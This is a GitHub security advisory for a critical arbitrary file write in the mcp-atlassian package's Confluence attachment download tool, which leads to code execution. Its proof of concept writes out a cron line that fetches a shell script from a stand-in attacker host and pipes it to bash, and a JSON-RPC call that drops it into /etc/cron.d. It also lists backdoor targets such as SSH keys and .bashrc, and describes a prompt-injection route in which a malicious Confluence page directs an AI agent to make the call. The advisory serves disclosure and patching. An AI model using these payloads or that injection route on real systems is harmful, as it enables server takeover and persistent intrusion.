# [C] MCP Atlassian has an arbitrary file write leading to arbitrary code execution via unconstrained download_path in confluence_download_attachment

## Summary
Severity: Critical
Advisory: GHSA-xjgw-4wvw-rgm4
CVE: CVE-2026-27825
CWE: CWE-22, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-xjgw-4wvw-rgm4
Type: github-advisory

## Affected
- PyPI: `mcp-atlassian` — affected >=0 <0.17.0

## Details
### Summary
The `confluence_download_attachment` MCP tool accepts a `download_path` parameter that is written to without any directory boundary enforcement. An attacker who can call this tool and supply or access a Confluence attachment with malicious content can write arbitrary content to any path the server process has write access to. Because the attacker controls both the write destination and the written content (via an uploaded Confluence attachment), this constitutes for arbitrary code execution (for example, writing a valid cron entry to `/etc/cron.d/` achieves code execution within one scheduler cycle with no server restart required).


### Details
The tool parameter is defined in `src/mcp_atlassian/servers/confluence.py:~1275` without any path restriction:

  ```python
  download_path: Annotated[
      str,
      Field(
          description=(
              "Full path where the file should be saved. Can be absolute or relative. "
              "Examples: './downloads/report.pdf', '/tmp/image.png', 'C:\\\\temp\\\\file.docx'. "
              "Parent directory will be created if it doesn't exist."
          )
      ),
  ],

 The implementation at src/mcp_atlassian/confluence/attachments.py:183–200:

  if not os.path.isabs(target_path):
      target_path = os.path.abspath(target_path)  # normalizes path, no restriction

  os.makedirs(os.path.dirname(target_path), exist_ok=True)  # creates any directory
  with open(target_path, "wb") as f:                        # writes to any writable path
      for chunk in response.iter_content(chunk_size=8192):
          f.write(chunk)

 os.path.abspath() converts relative paths to absolute but performs no directory boundary check. No configurable base download directory is enforced. There is no validation between the tool parameter and the file write. The same issue exists in download_content_attachments via its target_dir parameter (src/mcp_atlassian/servers/confluence.py:~1389).


### PoC
Prerequisites: Confluence credentials with access to at least one page. To control the written file content, upload a malicious attachment to any Confluence page you have write access to.

Step 1 — Prepare the payload. Create a file containing a valid cron entry and upload it as a Confluence attachment:

  * * * * * root curl http://attacker.com/shell.sh | bash

Step 2 — Call the tool with a sensitive write target:

  {
      "jsonrpc": "2.0",
      "method": "tools/call",
      "params": {
          "name": "confluence_download_attachment",
          "arguments": {
              "page_id": "<page id hosting the malicious attachment>",
              "attachment_id": "<attachment id>",
              "download_path": "/etc/cron.d/mcp-backdoor"
          }
      },
      "id": 1
  }

The attachment content is written verbatim to /etc/cron.d/mcp-backdoor. The system scheduler executes it within one minute with no further attacker action required.

Alternative potential write targets demonstrating broader impact:
  - /home/<user>/.ssh/authorized_keys - persistent SSH backdoor
  - <venv>/lib/python3.x/site-packages/<any_imported_module>.py - code execution on next import
  - ~/.bashrc - code execution on next user login

### Impact
An attacker who can invoke MCP tools and upload (or access) a Confluence attachment with controlled content can achieve arbitrary code execution on the server host. The MCP HTTP transport endpoints carry no authentication by default, meaning any host that can reach the server's HTTP port can call tools using the server's own embedded Confluence credentials (global fallback). The default HOST=0.0.0.0 binding makes this reachable from the local network without any configuration change.

In enterprise deployments where Confluence write access is broadly granted, the effective attacker prerequisite reduces to network access to the MCP HTTP port. This is also reachable without direct network access: a malicious Confluence page can embed LLM instructions directing an AI agent to call confluence_download_attachment with attacker-specified parameters, achieving code execution through the agent as an unwitting intermediary.

Example potential RCE paths:
 1. Cron job injection - write a cron entry to /etc/cron.d/; executes within one scheduler cycle, no restart required
 2. Python package hijack - overwrite any .py module in the application's virtual environment; executes on next import or server restart.
 3. SSH authorized_keys - write an attacker-controlled public key; grants persistent interactive shell access.
 4. Shell profile injection - write to ~/.bashrc or ~/.profile; executes on next user login.

## References
- https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-xjgw-4wvw-rgm4
- https://github.com/sooperset/mcp-atlassian/commit/52b9b0997681e87244b20d58034deae89c91631e
- https://github.com/sooperset/mcp-atlassian
